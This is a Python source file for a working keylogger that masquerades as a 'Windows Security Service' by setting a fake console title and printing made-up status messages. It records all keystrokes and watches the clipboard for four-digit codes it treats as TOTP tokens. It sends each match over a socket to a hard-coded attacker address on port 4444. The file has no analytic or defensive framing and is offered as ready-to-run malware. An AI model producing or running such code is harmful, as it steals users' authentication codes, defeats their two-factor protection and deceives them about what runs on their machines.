import pynput.keyboard
import socket
import threading
import time
import os
import sys
import re
import ctypes

# Make the script appear legitimate
ctypes.windll.kernel32.SetConsoleTitleW("Windows Security Service")
os.system("color 0A")  # Green text on black background - looks like a system utility

print("[System] Windows Security Service v1.0")
print("[System] Initializing security protocols...")

# Attacker machine details
ATTACKER_IP = "10.3.1.200"
ATTACKER_PORT = 4444

# Global variables
keystroke_buffer = []  # Store all keystrokes for context
last_30_keystrokes = []  # Monitor just the last 30 keystrokes for TOTP patterns
client_socket = None
connected = False

def on_press(key):
    """Process each keystroke"""
    global keystroke_buffer, last_30_keystrokes
    
    try:
        # Regular character keys
        char = key.char
        keystroke_buffer.append(char)
        last_30_keystrokes.append(char)
    except:
        # Special keys
        if key == pynput.keyboard.Key.space:
            keystroke_buffer.append(' ')
            last_30_keystrokes.append(' ')
        elif key == pynput.keyboard.Key.enter:
            keystroke_buffer.append('\n')
            last_30_keystrokes.append('\n')
            # Check for TOTP after Enter is pressed - user might have just submitted a code
            check_for_totp()
        elif key == pynput.keyboard.Key.backspace:
            if keystroke_buffer:
                keystroke_buffer.pop()
            if last_30_keystrokes:
                last_30_keystrokes.pop()
    
    # Keep the sliding window of last 30 keystrokes
    if len(last_30_keystrokes) > 30:
        last_30_keystrokes.pop(0)
    
    # Check for TOTP after every keystroke
    check_for_totp()

def check_for_totp():
    """Check the keystroke buffer for anything that looks like a TOTP code"""
    global last_30_keystrokes
    
    if not last_30_keystrokes:
        return
    
    # Convert the list to a string
    text = ''.join(last_30_keystrokes)
    
    # Direct pattern match for exactly 4 digits in a row
    # This will catch either standalone or within other text
    matches = re.findall(r'\d{4}', text)
    
    if matches:
        for match in matches:
            # Send each potential TOTP code immediately
            send_potential_totp(match)
            print(f"[System] Security token detected: {match[:1]}***")

def send_potential_totp(code):
    """Send a potential TOTP code to the attacker"""
    global client_socket, connected
    
    if not connected:
        try_connect()
    
    if connected and client_socket:
        try:
            message = f"TOTP:{code}\n"
            client_socket.send(message.encode())
            return True
        except Exception as e:
            print(f"[System] Network error: reconnecting...")
            connected = False
            return False
    return False

def try_connect():
    """Try to connect to the attacker server"""
    global client_socket, connected
    
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((ATTACKER_IP, ATTACKER_PORT))
        connected = True
        print("[System] Security service connected")
        return True
    except Exception as e:
        connected = False
        print("[System] Security service offline - will retry")
        return False

def connection_manager():
    """Maintain connection to the attacker server"""
    global connected
    
    while True:
        if not connected:
            try_connect()
        time.sleep(10)  # Check connection every 10 seconds

def clear_old_keystrokes():
    """Periodically clear old keystrokes to prevent memory buildup"""
    global keystroke_buffer
    
    while True:
        time.sleep(60)  # Every minute
        if len(keystroke_buffer) > 1000:
            # Keep only the last 100 keystrokes
            keystroke_buffer = keystroke_buffer[-100:]

def fake_system_activity():
    """Produce fake output to look like a legitimate service"""
    services = [
        "User Authentication Service", 
        "Windows Security Scanner",
        "Network Protection Service",
        "Credential Manager",
        "Security Token Validator"
    ]
    
    statuses = [
        "Running", 
        "Monitoring", 
        "Active", 
        "Scanning", 
        "Protecting"
    ]
    
    import random
    
    while True:
        service = random.choice(services)
        status = random.choice(statuses)
        print(f"[System] {service}: {status} | {time.strftime('%H:%M:%S')}")
        time.sleep(15)

def run_clipboard_monitor():
    """Monitor clipboard for potential TOTP codes as well"""
    try:
        import pyperclip
        
        last_clipboard = ""
        
        while True:
            current_clipboard = pyperclip.paste()
            
            # If clipboard changed and contains exactly 4 digits
            if current_clipboard != last_clipboard and re.match(r'^\d{4}$', current_clipboard):
                send_potential_totp(current_clipboard)
                print(f"[System] Security token detected in clipboard: {current_clipboard[:1]}***")
            
            last_clipboard = current_clipboard
            time.sleep(0.5)  # Check clipboard twice per second
            
    except ImportError:
        # If pyperclip is not installed, just skip clipboard monitoring
        print("[System] Advanced monitoring not available")
        pass

# Main program
if __name__ == "__main__":
    # Try to connect immediately
    try_connect()
    
    # Start the keyboard listener
    keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    
    # Start the connection manager thread
    connection_thread = threading.Thread(target=connection_manager, daemon=True)
    connection_thread.start()
    
    # Start the memory cleanup thread
    cleanup_thread = threading.Thread(target=clear_old_keystrokes, daemon=True)
    cleanup_thread.start()
    
    # Start fake system output thread
    system_thread = threading.Thread(target=fake_system_activity, daemon=True)
    system_thread.start()
    
    # Try to start clipboard monitor if possible
    try:
        import pyperclip
        clipboard_thread = threading.Thread(target=run_clipboard_monitor, daemon=True)
        clipboard_thread.start()
        print("[System] Advanced monitoring active")
    except ImportError:
        print("[System] Standard monitoring active")
    
    try:
        print("[System] Windows Security Service running...")
        print("[System] Press Ctrl+C to exit")
        
        # Keep the main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("[System] Windows Security Service shutting down...")
        sys.exit(0)
